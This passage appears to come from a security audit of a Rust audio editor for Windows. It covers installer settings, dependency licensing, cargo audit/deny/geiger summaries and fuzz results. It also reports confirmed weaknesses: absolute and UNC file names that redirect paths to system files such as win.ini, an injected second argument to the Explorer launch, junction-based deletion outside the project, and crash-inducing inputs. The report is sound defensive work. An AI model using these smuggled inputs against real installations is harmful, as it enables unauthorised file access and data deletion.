- Inno Setup: per-user default (`PrivilegesRequired=lowest`, `{autopf}` resolves to `%LOCALAPPDATA%\Programs`), no `[Code]`, no registry or PATH edits, uninstall leaves user data, fixed `AppId`, `MinVersion=10.0`, `CloseApplications=yes`; the post-install launch runs as the original user (AE-14, verified against the Inno help). Issues: AE-15, AE-09 (shipped files).
- `scripts/*.ps1`, `*.py`: AE-20. `make_icon.py` only reads constants and writes `assets/icon/`.

### h. Licensing

AE-09. Inventory from `cargo deny list`: LGPL-3.0 (2 crates, mp3lame), MPL-2.0 (13: symphonia family and `option-ext`), OFL-1.1 and Ubuntu-font-1.0 (`epaint_default_fonts`), BSL-1.0 (2), and permissive licenses (MIT, Apache-2.0, BSD, ISC, Zlib, Unicode-3.0, Unlicense, 0BSD). `self_cell` (Apache-2.0 OR GPL-2.0-only) and `r-efi` (MIT OR Apache-2.0 OR LGPL-2.1-or-later) are dual-licensed with a permissive option. No GPL-only or AGPL dependency. MPL files are unmodified (notice duty only).

---

## Tool output summaries

### `cargo audit` (0.22.2, advisory DB 1,380 advisories, 486 crates scanned)

Exit 0. **0 vulnerabilities, 6 allowed warnings:**

| Crate | Version | Kind | Advisory | In Windows build? |
|---|---|---|---|---|
| ttf-parser | 0.25.1 | unmaintained | RUSTSEC-2026-0192 | No |
| zbus_names | 4.3.4 | unmaintained | RUSTSEC-2026-0371 | No |
| zvariant | 5.15.0 | unmaintained | RUSTSEC-2026-0370 | No |
| zvariant_derive | 5.15.0 | unmaintained | RUSTSEC-2026-0372 | No |
| tokio | 1.53.2 | unsound (`AsyncFd::new` I/O safety) | RUSTSEC-2026-0386 | No |
| clipboard-win | 5.4.1 | **yanked** | - | **Yes** (arboard <- egui-winit <- eframe) |

### `cargo deny` (0.20.2)

`cargo deny init` writes `deny.toml` next to the manifest, which would have added a file to the repo, so it was run in a scratch copy of `Cargo.toml` + `Cargo.lock` (identical dependency graph) with the generated default config. Results:
- **advisories FAILED** under the default policy: the 4 unmaintained crates above are errors (not in the Windows graph) plus the yanked warning.
- **bans ok** (33 duplicate-version warnings, e.g. `windows-sys` x4, `windows-targets`, `thiserror` 1/2, `syn` 2/3).
- **sources ok** (crates.io only).
- **licenses FAILED**: 462 "rejected" results are an artifact of the generated config having an empty allow-list, not 462 real problems. Real notes: two deprecated SPDX identifiers (`LGPL-3.0` in `mp3lame-encoder` and `mp3lame-sys`), and `audio_editor` has no `license` field.

Suggested `deny.toml` allow-list for this tree: `MIT`, `Apache-2.0`, `Apache-2.0 WITH LLVM-exception`, `BSD-1-Clause`, `BSD-2-Clause`, `BSD-3-Clause`, `0BSD`, `ISC`, `Zlib`, `Unicode-3.0`, `Unlicense`, `BSL-1.0`, `MPL-2.0`, `OFL-1.1`, `Ubuntu-font-1.0`, `LGPL-3.0-only` (mp3lame), plus `exceptions`/`clarify` for the dual-licensed `self_cell` and `r-efi`.

### `cargo geiger` (0.14.0, summary)

| Scope | Functions | Expressions | Impls | Traits | Methods |
|---|---|---|---|---|---|
| **audio_editor (first-party)** | **0/0** | **0/660** | **0/5** | 0/0 | **0/165** |
| Whole dependency tree | 13,320 / 63,591 | 287,211 / 1,538,953 | 5,052 / 15,657 | 186 / 186 | 10,479 / 46,065 |

(x/y = unsafe used by the build / total unsafe found.) Most of the tree total is the generated `windows` crate (12,125/62,026 functions). Direct dependencies that use unsafe: `cpal` 9/21 fns, `rubato` 4/6, `rfd` 1/10, `trash` 3/3, `crossbeam-channel` 2/2, `arc-swap`, `anyhow`, `uuid`, `serde_json`, `hound`, `image`, `assert_no_alloc`. The whole `symphonia` family reports `:)` (forbids unsafe). Caveats: geiger skipped 8 files it could not parse (including `hound/src/lib.rs` and generated bindings) and does not count C code (LAME 3.100). It needed a short `CARGO_TARGET_DIR`: two attempts under the long scratch path failed while building crate build scripts (the first with `LNK1104`), consistent with the 260-character path limit.

### Verification harness and fuzz results

| Check | Result |
|---|---|
| Real `resample()`, 100-frame WAV at 1 Hz -> 48 kHz | 4,800,000 frames out (48,000x), 2.9 s release |
| Real `peaks::read`, block count `2^40` | `memory allocation of 8796093022208 bytes failed` (abort) |
| Real `peaks::read`, block count `2^62` | panic `capacity overflow` |
| Real `samples_to_timecode(1, 0)` | panic `attempt to divide by zero` |
| Real `DeviceResampler`, 96k and 192k on 48k | fine (ratio 2 and 4) |
| Real `DeviceResampler`, 384k and 1M on 48k | panic on 2nd callback (release and debug) |
| `Path::join` with UNC/absolute/rooted `file_name` | base replaced; `C:\Windows\win.ini` resolves and `is_file()` is true |
| `reveal_in_explorer` with injected second argument | argument split confirmed; Notepad not launched on this machine |
| Real `cleanup_unused`, case-mismatched `file_name` | file removed |
| Real `cleanup_unused`, `media/` junction to outside folder | outside files removed |
| `copy_tree` with parent inside the project | recursion reached the cap of 12 |
| Mutation fuzz of real `decode_file`, release | 4,000 + 30,000 + 30,000 cases (3 seeds): 0 panics, 0 timeouts; ~83% decoded, rest clean errors |
| Same fuzz, debug build, 8,000 cases | 18 overflow panics, all in `symphonia-format-riff` `chunks.rs:100` (log-only) |

## Checked, no issues

- No `unsafe` in first-party code; no `unwrap`/`expect` outside tests/`main.rs`; no `todo!`/`unimplemented!`.
- No network code (`std::net`, HTTP crates, URL opening); no telemetry; the only process launch is `explorer.exe`.
- Decoder robustness on mutated WAV/MP3 (release): no panic, hang or abort in 64,000 cases; 4+ channel files rejected (`decode.rs:65-67`).
- `peaks::read`: magic, version, truncation and trailing-byte checks; `take()` cannot overflow `pos` (n <= 8).
- JSON: serde_json recursion limit, strict types, UUID-typed ids so cache file names cannot carry separators.
- `cleanup_cache` only matches `<uuid>.f32.wav` / `<uuid>.peaks`, skips non-files and never touches `autosave/` or `exports/`; `cleanup_media` skips `*.part` and non-regular files; cleanup failures do not fail Save.
- Export: `.part` guard (drop-safe, handle closed before delete), commit only after `finalize`, cancel and error paths abort the sink, NaN/inf handled in both sinks, overwrite confirmation asked exactly once.
- Mixer reads samples only through `.get()`; block indexing stays inside `out` even when positions wrap.
- Scrub reader and `Player` state machine: bounded indexes, preallocated window, no unbounded loop found.
- MP3 sink: buffer sizing correct, tag overwrite offset logic correct, bitrate whitelist.
- `trash::delete` flags (`FOF_NO_UI | FOF_ALLOWUNDO | FOF_WANTNUKEWARNING`).
- Saved view zoom is range-checked and falls back to fit (`timeline/mod.rs:179`, NaN-safe).
- `build.rs` has no network or arbitrary command execution; `mp3lame-sys` builds vendored source without downloading.
- PE: ASLR + high-entropy VA + NX on, GUI subsystem, system-DLL-only imports, static CRT.
- Installer: no `[Code]`, no registry/PATH changes, no data deletion on uninstall.
- Secrets scan of the repo (keys, tokens, private keys): none; no git remote configured.
- `cargo audit`: 0 vulnerabilities. `cargo deny`: bans and sources clean.
- License inventory: no GPL-only/AGPL dependency; MPL-2.0 code is unmodified.

## Not covered

No live SMB/WebDAV listener (AE-01 network behavior is inferred from Windows semantics and the `Path::join` result); the GUI was not driven end to end; cpal's behavior after a callback panic was not tested; the fuzz is shallow (byte mutations of two seeds, no coverage guidance, no MP3 encoder fuzz, no header-semantic fuzz); `trash` behavior for files larger than the Recycle Bin limit was not tested; LAME C code was not audited beyond its call sites; the licensing section (AE-09) is a technical review, not legal advice.
